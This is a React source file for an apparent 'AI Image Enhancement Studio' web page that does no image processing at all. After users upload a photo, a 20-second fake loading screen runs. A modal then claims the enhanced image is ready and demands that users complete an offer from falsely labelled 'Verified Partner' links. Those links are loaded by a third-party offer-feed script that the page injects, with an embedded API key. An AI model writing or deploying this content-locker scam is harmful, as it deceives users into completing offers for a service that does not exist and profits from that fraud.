import React, { useState, useRef } from 'react';
import { Upload, Image as ImageIcon, Loader2, Shield, ExternalLink } from 'lucide-react';

function App() {
  const [selectedImage, setSelectedImage] = useState<string | null>(null);
  const [prompt, setPrompt] = useState('');
  const [isGenerating, setIsGenerating] = useState(false);
  const [showOffers, setShowOffers] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const offerContainerRef = useRef<HTMLDivElement>(null);

  const handleImageUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setSelectedImage(reader.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleGenerate = () => {
    if (!selectedImage || !prompt) return;
    setIsGenerating(true);
    setTimeout(() => {
      setIsGenerating(false);
      setShowOffers(true);
    }, 20000);
  };

  React.useEffect(() => {
    if (showOffers && offerContainerRef.current) {
      const script = document.createElement('script');
      script.src = "https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js";
      script.onload = () => {
        const offerScript = document.createElement('script');
        offerScript.text = `
          $(function() {
            $.getJSON("https://drqp033qnd79l.cloudfront.net/public/offers/feed.php?user_id=538458&api_key=16388e91cdf3368db3bfd08d2dfe4ff0&s1=&s2=&callback=?", function(offers){
              var html = '';
              var numOffers = 2;
              offers = offers.splice(0, numOffers);
              $.each(offers, function(key, offer){
                html += '<div class="mb-6 p-6 bg-white rounded-xl shadow-md hover:shadow-lg transition-shadow border border-gray-100">' +
                  '<div class="flex items-start justify-between gap-4">' +
                    '<div class="flex-1">' +
                      '<div class="flex items-center gap-2 mb-2">' +
                        '<Shield class="w-5 h-5 text-green-600" />' +
                        '<span class="text-green-600 text-sm font-medium">Verified Partner</span>' +
                      '</div>' +
                      '<a href="'+offer.url+'" target="_blank" title="'+offer.conversion+'" class="group">' +
                        '<h4 class="text-lg font-semibold text-gray-900 group-hover:text-blue-600 transition-colors mb-2">'+offer.anchor+'</h4>' +
                        '<div class="flex items-center text-sm text-gray-600 group-hover:text-blue-600 transition-colors">' +
                          'Complete offer <ExternalLink class="w-4 h-4 ml-1" />' +
                        '</div>' +
                      '</a>' +
                    '</div>' +
                  '</div>' +
                '</div>';
              });
              $("#offerContainer").append(html);
            });
          });
        `;
        document.body.appendChild(offerScript);
      };
      document.body.appendChild(script);
    }
  }, [showOffers]);

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-50 to-blue-50 relative">
      <div className="container mx-auto px-4 py-4 sm:py-8">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-6 sm:mb-12">
            <h1 className="text-3xl sm:text-4xl font-bold text-gray-900 mb-2 sm:mb-4">AI Image Enhancement Studio</h1>
            <p className="text-base sm:text-lg text-gray-600">Transform your photos with cutting-edge AI technology</p>
          </div>

          <div className="bg-white rounded-xl sm:rounded-2xl shadow-lg sm:shadow-xl p-4 sm:p-8 mb-8">
            <div className="flex flex-col space-y-6">
              <div className="w-full">
                <div 
                  onClick={() => fileInputRef.current?.click()}
                  className="border-2 border-dashed border-gray-300 rounded-lg p-4 sm:p-8 text-center cursor-pointer hover:border-blue-500 transition-colors"
                >
                  {selectedImage ? (
                    <img src={selectedImage} alt="Preview" className="max-w-full h-auto rounded mx-auto" />
                  ) : (
                    <div className="space-y-3 sm:space-y-4">
                      <Upload className="w-10 h-10 sm:w-12 sm:h-12 mx-auto text-gray-400" />
                      <p className="text-sm sm:text-base text-gray-500">Tap to upload your photo</p>
                    </div>
                  )}
                  <input
                    ref={fileInputRef}
                    type="file"
                    accept="image/*"
                    onChange={handleImageUpload}
                    className="hidden"
                  />
                </div>

                <div className="mt-6 space-y-3">
                  <label className="block text-sm font-medium text-gray-700">
                    Describe your desired enhancement
                  </label>
                  <textarea
                    value={prompt}
                    onChange={(e) => setPrompt(e.target.value)}
                    className="w-full h-24 sm:h-32 px-3 py-2 text-sm sm:text-base border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    placeholder="E.g., Make me look more professional, enhance lighting..."
                  />
                </div>

                <button
                  onClick={handleGenerate}
                  disabled={!selectedImage || !prompt || isGenerating}
                  className={`w-full mt-4 py-3 px-6 rounded-lg text-white font-medium text-sm sm:text-base ${
                    !selectedImage || !prompt || isGenerating
                      ? 'bg-gray-400 cursor-not-allowed'
                      : 'bg-blue-600 hover:bg-blue-700 active:bg-blue-800'
                  } transition-colors`}
                >
                  {isGenerating ? (
                    <span className="flex items-center justify-center">
                      <Loader2 className="animate-spin mr-2 w-5 h-5" />
                      Generating...
                    </span>
                  ) : (
                    'Generate Enhanced Image'
                  )}
                </button>
              </div>

              <div className="w-full bg-gray-100 rounded-lg p-4 aspect-[3/4] sm:aspect-4/3 flex items-center justify-center relative overflow-hidden">
                {isGenerating ? (
                  <div className="relative w-full h-full">
                    <img 
                      src={selectedImage!} 
                      alt="Processing" 
                      className="absolute inset-0 w-full h-full object-cover opacity-50"
                    />
                    <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white to-transparent animate-[flow_2s_linear_infinite] opacity-70" />
                    <div className="absolute inset-0 flex items-center justify-center">
                      <div className="text-center space-y-3 bg-white/80 p-4 sm:p-6 rounded-lg backdrop-blur-sm">
                        <Loader2 className="w-10 h-10 sm:w-12 sm:h-12 animate-spin mx-auto text-blue-600" />
                        <p className="text-sm sm:text-base text-gray-800 font-medium">Enhancing your image...</p>
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className="text-center text-gray-500">
                    <ImageIcon className="w-12 h-12 sm:w-16 sm:h-16 mx-auto mb-3 sm:mb-4" />
                    <p className="text-sm sm:text-base">Your enhanced image will appear here</p>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>

      {showOffers && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-xl sm:rounded-2xl shadow-xl p-4 sm:p-8 max-w-2xl w-full max-h-[90vh] overflow-y-auto">
            <div className="text-center mb-6">
              <h3 className="text-xl sm:text-2xl font-semibold text-gray-900 mb-2">Your enhanced image is ready!</h3>
              <p className="text-sm sm:text-base text-gray-600">Complete one quick offer from our trusted partners to unlock your enhanced photo</p>
            </div>
            <div id="offerContainer" ref={offerContainerRef} className="space-y-4"></div>
          </div>
        </div>
      )}
    </div>
  );
}

export default App;